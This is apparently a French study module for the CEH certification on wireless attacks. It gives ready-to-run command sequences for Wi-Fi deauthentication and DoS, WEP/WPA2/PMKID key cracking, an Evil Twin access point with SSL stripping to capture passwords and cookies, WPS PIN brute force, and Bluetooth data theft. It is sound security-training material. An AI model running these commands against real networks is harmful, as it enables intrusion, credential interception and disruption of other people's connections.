# 🔴 Module 16 — Attaques sur les Réseaux Sans Fil

> **CEH v13 | EC-Council**  
> `#Deauth` `#EvilTwin` `#WPACracking` `#PMKID` `#Reaver` `#Bluetooth`

---

## 📌 Table des matières

1. [Attaque de Déauthentification](#1-déauthentification)
2. [Cracking WEP](#2-cracking-wep)
3. [Cracking WPA/WPA2 (Handshake)](#3-cracking-wpa)
4. [Attaque PMKID](#4-attaque-pmkid)
5. [Evil Twin / Rogue AP](#5-evil-twin)
6. [Attaques WPS](#6-attaques-wps)
7. [Attaques Bluetooth](#7-bluetooth)

---

## 1. Attaque de Déauthentification

Force un client à se déconnecter de l'AP (utile pour capturer le re-handshake).

```bash
# Mettre en mode monitor :
airmon-ng start wlan0

# Scanner les réseaux :
airodump-ng wlan0mon
# Identifier : BSSID de la cible, canal (CH), STATION (client)

# Lancer la déauth :
aireplay-ng --deauth 10 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
#           ↑ 10 paquets deauth vers le client cible
# Si -c omis : déauth de tous les clients du réseau

# Déauth continue (DoS Wi-Fi) :
aireplay-ng --deauth 0 -a TARGET_BSSID wlan0mon  # 0 = illimité
```

> ⚠️ **Protection WPA3 PMF** : Les Protected Management Frames chiffrent les trames de déauth → la déauth forgée est ignorée.

---

## 2. Cracking WEP

```bash
# Étape 1 : Passer en mode monitor
airmon-ng start wlan0

# Étape 2 : Capturer les IVs WEP
airodump-ng --bssid TARGET_BSSID -c TARGET_CHANNEL wlan0mon -w wep_capture

# Étape 3 : Accélérer la collecte (injection ARP)
# Associer d'abord :
aireplay-ng -1 0 -a TARGET_BSSID wlan0mon

# Injection ARP replay attack :
aireplay-ng -3 -b TARGET_BSSID -h OUR_MAC wlan0mon
# → Génère des milliers de paquets par minute → collecte rapide des IVs

# Étape 4 : Cracker la clé WEP
aircrack-ng wep_capture-01.cap
# → KEY FOUND ! [ AB:CD:EF:01:23 ] (si suffisamment d'IVs ~20000+)
```

---

## 3. Cracking WPA/WPA2 (Handshake)

```bash
# Étape 1 : Mode monitor
airmon-ng start wlan0

# Étape 2 : Capturer le handshake
airodump-ng --bssid TARGET_BSSID -c TARGET_CHANNEL wlan0mon -w wpa_capture
# Attendre un handshake (connexion naturelle) OU
# Forcer avec déauth :
aireplay-ng --deauth 5 -a TARGET_BSSID wlan0mon
# → "WPA handshake: XX:XX:XX:XX:XX:XX" apparaît dans airodump-ng ✓

# Étape 3 : Cracker avec aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# Étape 3 alternative : Hashcat (beaucoup plus rapide avec GPU)
# Convertir le .cap en format Hashcat :
hcxpcapngtool wpa_capture-01.cap -o hash.hc22000
# Cracker avec Hashcat :
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d  # 8 chiffres
```

---

## 4. Attaque PMKID

Ne nécessite pas de capturer un handshake ! Fonctionne depuis le premier frame EAPOL.

```bash
# Outils : hcxdumptool + hcxtools

# Étape 1 : Capturer le PMKID
hcxdumptool -i wlan0mon -o capture.pcapng \
  --enable_status=1 \
  --filterlist_ap=TARGET_BSSID    # Filtrer par AP cible

# Étape 2 : Convertir pour Hashcat
hcxpcapngtool -o hash.pmkid capture.pcapng
# ou :
hcxpcapngtool capture.pcapng -o hash.hc22000

# Étape 3 : Brute force avec Hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Avantage PMKID vs Handshake :
# - Pas besoin d'attendre un client (ou déauth)
# - Il suffit d'être à portée de l'AP
```

---

## 5. Evil Twin / Rogue AP

Créer un AP malveillant avec le même SSID pour intercepter le trafic.

```bash
# Scénario : réseau cible "CaféWiFi"

# Étape 1 : Déauthentifier les clients de l'AP légitime
aireplay-ng --deauth 0 -a LEGITIMATE_AP_BSSID wlan0mon

# Étape 2 : Créer un AP Evil Twin avec hostapd
# /etc/hostapd-wpe.conf :
interface=wlan1
ssid=CaféWiFi          ← Même SSID !
channel=6
hw_mode=g
auth_algs=1

hostapd-wpe /etc/hostapd-wpe.conf

# Étape 3 : DHCP + DNS pour les victimes
dnsmasq --interface=wlan1 --dhcp-range=192.168.1.2,192.168.1.20

# Étape 4 : Capturer le trafic
wireshark -i wlan1
# → Tous les mots de passe HTTP, cookies, etc.

# Étape 5 : SSL Stripping (si nécessaire)
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

### KARMA Attack

```
KARMA exploite le fait que les appareils recherchent activement leurs réseaux connus.

Client : Probe Request "CaféWiFi" ?
KARMA AP : "Oui, c'est moi !"
→ L'AP répond à TOUT probe request avec n'importe quel SSID
→ Les appareils se connectent automatiquement
```

---

## 6. Attaques WPS

```bash
# Reaver — Brute force WPS PIN
reaver -i wlan0mon -b TARGET_BSSID -vv

# Options utiles :
reaver -i wlan0mon -b TARGET_BSSID -c CHANNEL \
  --delay=1 \     # Délai entre tentatives (anti-lock)
  --pin=12345670  # Tester un PIN spécifique
  -vv             # Verbose

# Bully — Alternative à Reaver
bully wlan0mon -b TARGET_BSSID -c CHANNEL -v 3

# Temps estimé :
# WPS standard : 4-10 heures (20000 tentatives max)
# Avec lock AP après X tentatives : plus long

# wifite — Automatisation
wifite --wps
```

---

## 7. Attaques Bluetooth

| Attaque | Description | Prérequis |
|---------|-------------|-----------|
| **Bluejacking** | Envoyer des messages non sollicités | Bluetooth visible |
| **Bluesnarfing** | Voler des données (contacts, calendrier) | Appariement vulnérable |
| **Bluebugging** | Prendre le contrôle (appels, SMS) | Vulnérabilité firmware |
| **Bluesmacking** | DoS via L2CAP overflow | À portée BT |
| **BlueBorne** (2017) | RCE sans appariement via vulnérabilités Bluetooth | Patché depuis |

```bash
# Scan Bluetooth :
hcitool scan                    # Découvrir les appareils proches
hcitool inq                     # Inquiry scan
bluetoothctl scan on            # CLI moderne

# BTScanner :
btscanner                       # Interface ncurses pour scan BT

# Bluesnarfer :
bluesnarfer -b TARGET_BT_MAC -r 1-100  # Lire les contacts
```

---

## 🧠 Points clés à retenir pour l'examen

- **Déauth** = forger des trames de déauthentification (non chiffrées en WPA2)
- **WPA2 handshake cracking** = capturer le 4-way handshake + dictionnaire
- **PMKID** = attaque sans handshake (2018), plus rapide
- **Evil Twin** = AP malveillant même SSID → MITM
- **WPS PIN** = brute forceable en ~4-10h (Reaver/Bully), 20000 combinaisons max
- **Bluejacking** = messages non sollicités ; **Bluesnarfing** = vol de données

---

*⬅️ [Protocoles et vulnérabilités](./02_protocoles_vulnerabilites.md) | ➡️ [Outils et Labs](./04_outils_et_labs.md)*
